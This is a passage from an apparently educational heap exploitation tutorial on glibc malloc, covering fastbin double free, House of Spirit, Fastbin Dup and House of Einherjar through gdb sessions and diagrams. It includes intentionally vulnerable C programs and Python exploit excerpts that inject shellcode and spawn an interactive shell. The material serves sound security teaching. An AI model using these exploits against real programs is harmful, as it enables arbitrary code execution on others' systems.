(gdb) display main_arena->fastbinsY
1: main_arena->fastbinsY = {0x603000, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
(gdb) print *(mchunkptr)0x603000
$1 = {prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x21}

When the first chunk is free'd, it is inserted first in the fastbin list with a NULL
pointer as forward pointer.

(gdb) c
Continuing.
[2] free(0x603030);

Breakpoint 1, main (argc=6, argv=0x7fffffffe608) at mallfest.c:87
87                continue;
1: main_arena->fastbinsY = {0x603020, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
(gdb) print *(mchunkptr)0x603020
$2 = {prev_size = 0, size = 33, fd = 0x603000, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x20fc1}

When the second chunk is free'd it is inserted as the head of the fastbin
with the forward pointer set to the first chunk free'd.

(gdb) c
Continuing.
[1] free(0x603010);

Breakpoint 1, main (argc=6, argv=0x7fffffffe608) at mallfest.c:87
87                continue;
1: main_arena->fastbinsY = {0x603000, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
(gdb) print *(mchunkptr)0x603000
$3 = {prev_size = 0, size = 33, fd = 0x603020, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x21}
(gdb) print *(mchunkptr)0x603020
$4 = {prev_size = 0, size = 33, fd = 0x603000, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x20fc1}

When the first chunk is free'd one more time things get messy. The first chunk 
is inserted first in the fastbin, just as before. But since the chunk is already
free'd it also exist at the end of the fastbin list. This is possible because the
fastbin is not traversed when inserting a new chunk since it would increase the
complexity from O(1) to O(n). Now the fastbin look like this:


      Chunk 0x603000
 ---> +-------------+        
 |    | prev_size ? |        
 |    +-------------+
 |    |  size:33    |        
 |    +-------------+       Chunk 0x603020   
 |    | fd:0x603020 | ----> +-------------+       
 |    +-------------+       | prev_size ? |
 |                          +-------------+
 |                          |  size:33    |
 |                          +-------------+
 |                          | fd:0x603000 | ---
 |                          +-------------+   |
 ----------------------------------------------

Now, when the next call to malloc occur with a size that match the fastbin,
then the first chunk in that fastbin is removed from the list and returned
to the caller. After that the fastbin will only have a single chunk, but that
chunk still have a forward pointer set to the chunk that was returned.

Running mallfest outside of the debugger verify that we indeed get the address
of the first chunk returned by malloc:

    $ ./mallfest 0x18 0x18 f:1 f:2 f:1 0x18
    [1] 0x603010 = malloc(0x18)
    [2] 0x603030 = malloc(0x18)
    [1] free(0x603010);
    [2] free(0x603030);
    [1] free(0x603010);
    [6] 0x603010 = malloc(0x18)
    Done.

If we control the content of the chunk returned by malloc, which still exist
in the fastbin, we can write whatever we want as the forward pointer in that
chunk, making us control where in memory the forward pointer points to. We
make use of this to "extend" the fastbin list to point to a fake chunk.
The constraint here is that the size of the fake chunk must match the fastbin
size. It will look like this:

   fastbinsY[0]
      |
      |
      v                       (Double Free'd)           (Fake Chunk)
      Chunk 0x603020          Chunk 0x603000          Chunk 0xXXXXXX
      +-------------+   ----> +-------------+   ----> +-------------+
      | prev_size ? |   |     | prev_size ? |   |     | prev_size ? |
      +-------------+   |     +-------------+   |     +-------------+
      |  size:33    |   |     |  size:33    |   |     |  size:33    |
      +-------------+   |     +-------------+   |     +-------------+
      | fd:0x603000 | --      | fd:0xXXXXXX | --      | fd:0x?????? |
      +-------------+         +-------------+         +-------------+

The next call to malloc with the fastbin size returns chunk 0x603020
by removing it from the head of the fastbin. We do not really care about 
that, but the fastbin now look like this:

   fastbinsY[0]
      |
      |
      v (Double Free'd)         (Fake Chunk)
      Chunk 0x603000          Chunk 0xXXXXXX
      +-------------+   ----> +-------------+
      | prev_size ? |   |     | prev_size ? |
      +-------------+   |     +-------------+
      |  size:33    |   |     |  size:33    |
      +-------------+   |     +-------------+
      | fd:0xXXXXXX | --      | fd:0x?????? |
      +-------------+         +-------------+

The idea here is to trigger enough malloc calls to remove all the valid chunks
from the fastbin so that our fake chunk is at the head of the list. In this
example we just need one more call to malloc of the fastbin size. The goal
is to end up with a fastbin that looks like this:

   fastbinsY[0]
      |
      |
      v (Fake Chunk)
      Chunk 0xXXXXXX
      +-------------+
      | prev_size ? |
      +-------------+
      |  size:33    |
      +-------------+
      | fd:0x?????? |
      +-------------+

Now, the next call to malloc with the fastbin size will return a pointer
to the location of our fake chunk. If we control what is written to that 
address we can overwrite something that makes us take control over the
execution flow.

We can now exploit the following vulnerable function:

-- Begin lines from vuln_3.2.c

    13    void
    14    vuln(void)
    15    {
    16        void *bufa;
    17        void *bufb;
    18    
    19        uint64_t chunk_size;
    20        uint64_t len;
    21    
    22        /* Simulate a leak of a memory area
    23         * which holds the size of the chunk */
    24        fread(&len, sizeof(len), 1, stdin);
    25        fprintf(stderr, "%p\n", &chunk_size);
    26    
    27        /* Vulnerable code */
    28        chunk_size = CHUNK_SIZE(len);
    29        bufa = malloc(len);
    30        bufb = malloc(len);
    31        free(bufa);
    32        free(bufb);
    33        free(bufa);
    34    
    35        /* Double free'd chunk, read fwd pointer */
    36        bufa = malloc(len);
    37        fread(bufa, sizeof(uint64_t), 1, stdin);
    38    
    39        /* Empty fastbin until fake chunk 
    40         * is the only chunk */
    41        malloc(len);
    42        malloc(len);
    43    
    44        /* Finally, malloc returns our fake chunk 
    45         * from the fastbin */
    46        bufb = malloc(len);
    47        fgets(bufb, len, stdin);
    48    }

-- End

The interesting lines in python for the exploit follows.

-- Begin lines from vuln_3.2-xpl.py

    91    print("[+] Using shellcode of %d bytes" %(len(code)))
    92    
    93    # Send fastbin malloc size
    94    malloc_size = 0x70-8
    95    s.send(struct.pack("<Q", int(malloc_size)))
    96    
    97    # Read the address where the chunk size is stored
    98    leak = int(readuntil(s, "\n"), 16)
    99    print("[+] Chunk size at 0x%x" %(leak))
   100    
   101    # Send address to our fake chunk
   102    # which will be set as the forward pointer in 
   103    # the chunk that was double free'd
   104    fake_chunk = leak - 8 # 8 bytes before chunk size
   105    print("[+] Using fake chunk at 0x%x" %(fake_chunk))
   106    s.send(struct.pack("<Q", fake_chunk))
   107    
   108    ret_addr = leak + 24 + 16
   109    print("[+] Using return address 0x%x" %(ret_addr))
   110    
   111    # Send data to overwrite memory
   112    # where the fake chunk resides
   113    s.send(struct.pack("<Q", ret_addr)*4 + code.rjust(36, '\x90') + '\n')
   114    
   115    s.send("id\n")
   116    interact(s)
   117    sys.exit(0)

-- End 

--[ 3.3 House of Spirit (Adapted From [4])
Requirements:
1) Control address given as argument to free
2) The uint64_t value at negative offset 8 from the address to free must 
   be a valid chunk size for a fastbin
3) The size value of the next chunk when using the size at the negative
   offset for calculating the next chunk must fall into a valid chunk size 
   range, which is larger than 16 and smaller  than 131072 (=128kb that is 
   the upper limit for system memory of the main arena)
4) A call to malloc which will result in the chunk size at 2)

The outcome of this technique can be summarized as "if you control the
value of the pointer passed onto free, then a future call to malloc can 
return that pointer", which is also called a fake-free [6]. This is useful 
when data written to that location is controlled if that location contain 
data related to execution flow in some way. The simplest example is a function 
pointer but there could be other things which allow us to trigger another 
vulnerability to exploit, like controlling the content of a string to convert 
the vulnerability into a format string vulnerability when the string is passed 
onto printf(3) etc.

The memory must have a layout like this when using a fastbin size of 0x40:

                        Fake Chunk
                        +--------------+
                        |   pre_size   |  8 bytes
                        +--------------+
                        |fast_bin_size |  8 bytes (0x40)
   address to free ---> +--------------+
                        |      ??      |  8 bytes
                        +--------------+
                        |      ??      |  8 bytes
                        +--------------+
                        |      ??      |  8 bytes
                        +--------------+
                        |      ??      |  8 bytes
                        +--------------+
                        |      ??      |  8 bytes
                        +--------------+
                        |      ??      |  8 bytes
  Fake Chunk + 0x40 --> +--------------+
                        |  prev_size   |  8 bytes
                        +--------------+
                        |  chunk_size  |  8 bytes (> 16 && < 128*1024)
                        +--------------+

If the fastbin size changes, the chunk_size need to be at a different offset
which suit the size of the first fake chunk size when the location of the 
next chunk is computed by free. So, if there are interesting things to 
overwrite in between index 2 and index 9 which represent the data of the first 
fake chunk, we can exploit that to take over execution flow. This works since
we trick free(3) into placing the fake chunk first in the fastbin for the 
chunk of the given size and when malloc is called next with that size, the 
fake chunk is returned. The fast_bin_size decide which fastbin to use and
the chunk_size of the next chunk must pass some internal checks before the
fake chunk is actually placed in the fastbin.

Lets look at vuln_3.3.c which is an example of a vulnerable program:

-- Begin lines from vuln_3.3.c
    12    struct data {
    13        uint64_t prev_size1;
    14        uint64_t chunk_size;
    15        uint64_t data1;
    16        void (*funcpt)();
    17        uint64_t data3;
    18        uint64_t data4;
    19        uint64_t data5;
    20        uint64_t data6;
    21        uint64_t prev_size;
    22        uint64_t valid_chunk_size;
    23    } __attribute__((aligned(16)));
    24    
    25    void
    26    logfunc()
    27    {
    28        fprintf(stderr, "Hello World\n");
    29    }
    30    
    31    void
    32    vuln(void)
    33    {
    34        uint64_t *pointer;
    35        struct data fake_fast_bin;
    36        void *mem;
    37        uint64_t len;
    38    
    39        /* Set up the data structure */
    40        memset(&fake_fast_bin, 0x00, sizeof(fake_fast_bin));
    41        fake_fast_bin.funcpt = logfunc;
    42    
    43        /* 16 < valid_chunk_size < 128*1024 */
    44        fake_fast_bin.valid_chunk_size = 0x1234;
    45    
    46        /* Just call malloc to set up the main_arena */
    47        malloc(0x18);
    48    
    49        fprintf(stderr, "Please feed me a valid chunk size\n");
    50        fread(&fake_fast_bin.chunk_size, sizeof(uint64_t), 1, stdin);
    51        fprintf(stderr, "Data located at %p\n", &fake_fast_bin);
    52    
    53        fprintf(stderr, "Please feed me a pointer to free\n");
    54        fread(&pointer, sizeof(uint64_t *), 1, stdin);
    55        free(pointer);
    56        
    57        /* The next call to malloc with  length that will result in the
    58         * same fake fastbin chunk size will result in malloc returning
    59         * the address passed onto free previously */
    60        len = fake_fast_bin.chunk_size-8;
    61        mem = malloc(len);
    62        fprintf(stderr, "malloc(%ld)=%p\n", len, mem);
    63    
    64        fprintf(stderr, "Please send me at most %ld bytes\n", len);
    65        fgets(mem, len, stdin);
    66    
    67        /* Call the function pointer in the structure */
    68        fake_fast_bin.funcpt();
    69    }

-- End

In vuln_3.3.c the data structure represent some memory region which contain 
data that can be overwritten to take over execution flow if we can pass an
address of that structure to free(3). Although the vuln() function actually
set the valid chunk size for us, it is easy to imagine that we could place 
this value on the stack in some way, like calling a function which uses local
variables.

In this case our exploit is simple as it just supply the chunk size and
compute the return address, the interesting python lines are:

-- Begin lines from vuln_3.3-xpl.py

    90    readuntil(s, "Please feed me a valid chunk size\n", True)
    91    chunk_size = 0x40
    92    print("[+] Using chunk size 0x%x" %(chunk_size))
    93    s.send(struct.pack("<Q", chunk_size))
    94    
    95    # Read the location of data 
    96    data = readuntil(s, "\n")
    97    data = data.split(' ')
    98    addr = int(data[3], 16)
    99    print("[+] Fake fastbin located at 0x%x" %(addr))
   100    
   101    readuntil(s, "Please feed me a pointer to free\n", True) 
   102    print("[+] Sending 0x%x as pointer to free (fake fastbin + 16)" %(addr+16))
   103    s.send(struct.pack("<Q", addr + 16))
   104    
   105    readuntil(s, "\n");
   106    ret_addr = addr + 16 + 16
   107    print("[+] Using shellcode of %u bytes" %(len(code)))
   108    print("[+] Using return address 0x%x" %(ret_addr));
   109    s.send(struct.pack("<Q", ret_addr)*2 + code + '\n')
   110    
   111    s.send("id\n")
   112    interact(s)
   113    sys.exit(0)

-- End

--[ 3.4 - Fastbin Dup (Adapted from [4])
This is a double-free similar to the one in 3.2. With this one we also abuse
the fastbin to create a loop and show that the pointer returned for the
chunk which is double freed is actually returned twice is future calls to
malloc. The difference here is that we allocate three chunks for the same
fastbin size:

	$ ./mallfest 0x60 0x60 0x60 f:1 f:2 f:1 0x60 0x60 0x60
	[1] 0x603010 = malloc(0x60)
	[2] 0x603080 = malloc(0x60)
	[3] 0x6030f0 = malloc(0x60)
	[1] free(0x603010);
	[2] free(0x603080);
	[1] free(0x603010);
	[7] 0x603010 = malloc(0x60)
	[8] 0x603080 = malloc(0x60)
	[9] 0x603010 = malloc(0x60)
	Done.

At first we allocate three chunks with the same fastbin size, in this case 0x60
which be placed in the fastbinY array at index 5. After the double free of the
first allocated chunk, the fastbin array contain the first chunk twice, in a loop
like this:

   fastbinsY[0]
      |
      |
      v  
      Chunk 0x603000          Chunk 0x603070 
  --> +-------------+   ----> +-------------+  
  |   | prev_size ? |   |     | prev_size ? |
  |   +-------------+   |     +-------------+ 
  |   |  size:113   |   |     |  size:113   |
  |   +-------------+   |     +-------------+ 
  |   | fd:0x603070 | --      | fd:0x603000 | __ 
  |   +-------------+         +-------------+  |
  |___________________________________________ |

We can see this easilly using gdb and the mallfest program:
$ gdb ./mallfest
[snip]
(gdb) break mallfest.c:87
Breakpoint 1 at 0x400c25: file mallfest.c, line 87.
(gdb) r 0x60 0x60 0x60 f:1 f:2 f:1 0x60 0x60 0x60
Starting program: /raid1/overkill/private/github/ptmalloc2-ubuntu-16.04.4-64bit/mallfest 0x60 0x60 0x60 f:1 f:2 f:1 0x60 0x60 0x60
[1] 0x603010 = malloc(0x60)
[2] 0x603080 = malloc(0x60)
[3] 0x6030f0 = malloc(0x60)
[1] free(0x603010);

Breakpoint 1, main (argc=10, argv=0x7fffffffdf08) at mallfest.c:87
87	            continue;
(gdb) c
Continuing.
[2] free(0x603080);

Breakpoint 1, main (argc=10, argv=0x7fffffffdf08) at mallfest.c:87
87	            continue;
(gdb) c
Continuing.
[1] free(0x603010);

Breakpoint 1, main (argc=10, argv=0x7fffffffdf08) at mallfest.c:87
87	            continue;
(gdb) print *main_arena->fastbinsY[5]
$1 = {prev_size = 0, size = 113, fd = 0x603070, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}
(gdb) print main_arena->fastbinsY[5]
$2 = (mfastbinptr) 0x603000
(gdb) print (mfastbinptr)0x603070
$3 = (struct malloc_chunk *) 0x603070
(gdb) print *(mfastbinptr)0x603070
$4 = {prev_size = 0, size = 113, fd = 0x603000, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}


The next three calls to malloc with the fastbin size will result in removing
the fist chunk in the list, so the double free'd chunk will be returned twice:

(gdb) del 1
(gdb) c
Continuing.
[7] 0x603010 = malloc(0x60)
[8] 0x603080 = malloc(0x60)
[9] 0x603010 = malloc(0x60)
Done.
[Inferior 1 (process 4764) exited normally]
(gdb) 
 

--[ 3.5 - Fastbin Dup Consolidate (Adapted from [4])
A double free with a larger chunk allocated in between will result in
malloc returning the same pointer twice, lets look at this using mallfest:

    $ ./mallfest 0x40 0x40 f:1 0x400 f:1 0x40 0x40
    [1] 0x603010 = malloc(0x40)
    [2] 0x603060 = malloc(0x40)
    [1] free(0x603010);
    [4] 0x6030b0 = malloc(0x400)
    [1] free(0x603010);
    [6] 0x603010 = malloc(0x40)
    [7] 0x603010 = malloc(0x40)
    Done.

At first we allocate two fastbin chunks of size 0x40 and then we free the
first chunk allocated. The first chunk is then placed in the fastbin for
chunks of size 0x50.

$ gdb ./mallfest
[snip]
(gdb) break mallfest.c:87
Breakpoint 1 at 0x400c25: file mallfest.c, line 87.
(gdb) break mallfest.c:97
Breakpoint 2 at 0x400ccf: file mallfest.c, line 97.
(gdb) r 0x40 0x40 f:1 0x400 f:1 0x40 0x40
Starting program: ./mallfest 0x40 0x40 f:1 0x400 f:1 0x40 0x40
[1] 0x603010 = malloc(0x40)
[2] 0x603060 = malloc(0x40)
[1] free(0x603010);

Breakpoint 1, main (argc=8, argv=0x7fffffffddb8) at mallfest.c:87
87	            continue;
(gdb) print main_arena->fastbinY
There is no member named fastbinY.
(gdb) print main_arena->fastbinsY
$1 = {0x0, 0x0, 0x0, 0x603000, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
(gdb) print *main_arena->fastbinsY[3]
$2 = {prev_size = 0, size = 81, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}

When we allocate a large chunk, it actually trigger malloc_consolidate() which
move the free chunk into the small bin.

(gdb) break mallfest.c:93
Breakpoint 3 at 0x400c8e: file mallfest.c, line 93.
(gdb) c
Continuing.
[4] 0x6030b0 = malloc(0x400)

Breakpoint 3, main (argc=8, argv=0x7fffffffddb8) at mallfest.c:93
93	        chunks[i] = mem;
(gdb) print main_arena
$7 = {mutex = 0, flags = 1, fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x6034b0, last_remainder = 0x0, bins = {0x7ffff7dd1b78 <main_arena+88>, 
    0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 
    0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 
    0x7ffff7dd1ba8 <main_arena+136>, 0x603000, 0x603000, 0x7ffff7dd1bc8 <main_arena+168>, 

Next, when we trigger the double free of the first chunk, it gets added to the fastbin again
and exist in two places:

(gdb) c
Continuing.
[1] free(0x603010);

Breakpoint 1, main (argc=8, argv=0x7fffffffddb8) at mallfest.c:87
87	            continue;
(gdb) print main_arena
$10 = {mutex = 0, flags = 0, fastbinsY = {0x0, 0x0, 0x0, 0x603000, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x6034b0, last_remainder = 0x0, bins = {0x7ffff7dd1b78 <main_arena+88>, 
    0x7ffff7dd1b78 <main_arena+88>, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 
    0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 
    0x7ffff7dd1ba8 <main_arena+136>, 0x603000, 0x603000, 0x7ffff7dd1bc8 <main_arena+168>, 
[snip]

So our next two calls to malloc with the size of the double free'd chunk will 
return the same pointer twice since it exist in two locations.

(gdb) c
Continuing.
[6] 0x603010 = malloc(0x40)

Breakpoint 3, main (argc=8, argv=0x7fffffffddb8) at mallfest.c:93
93	        chunks[i] = mem;
(gdb) c
Continuing.
[7] 0x603010 = malloc(0x40)

Breakpoint 3, main (argc=8, argv=0x7fffffffddb8) at mallfest.c:93
93	        chunks[i] = mem;

--[ 3.6 - House of Einherjar (Adapted from [4])
With this technique, things are starting to get really interesting. The house of
Einherjar technique show how to exploit a zero byte off by one which overwrite
one byte in the size field of the next adjacent chunk. An off by one with a zero
byte is common when strings get padded with the NULL terminating byte.

To exploit a vulnerable program using the house of einherjar technique,
the tcache option must be disabled, which it is by default in Ubuntu 16.04.4
which we are using for this article.

The idea is to make use of the cleared "previous in use bit" in the size
field of the overflowed chunk to force a consolidation when the adjacent
chunk is free'd and return a pointer to a partly controlled memory area
in a future call to malloc.

The first step is to create a fake chunk with the previous in use bit cleared
somewhere in memory. To bypass internal checks we use the address of the fake
chunk for the forward and backward pointers as well as the forward and backward
next size pointers.


--[ References

[1] Canonical Group Ltd, "Ubuntu glibc package",
    Uploaded Jan 15 2018, 
    https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu10

[2] CarlosOdonell, "MallocInternals",
    Last Edited March 3 2018, 
    https://sourceware.org/glibc/wiki/MallocInternals

[3] xianwei, "malloc(): Might not Work as You Thought", 
    Uploaded September 29 2015, 
    http://iarchsys.com/?p=764

[4] shellphish, "Educational Heap Exploitation",
    Accessed July 13 2018, 
    https://github.com/shellphish/how2heap

[5] Naval Postgraduate School, "Advanced Cyber Vulnerability Assessment",
    Accessed Spring 2018, 
    CS4678

[6] M. Eckert, A. Bianchi, R. Wang, Y. Shoshitaishvili, C. Kruegel and G. Vigna.
	"HeapHopper: Bringing Bounded Model Checking to Heap Implementation Security", 2018,
	https://seclab.cs.ucsb.edu/media/uploads/papers/sec2018-heap-hopper.pdf

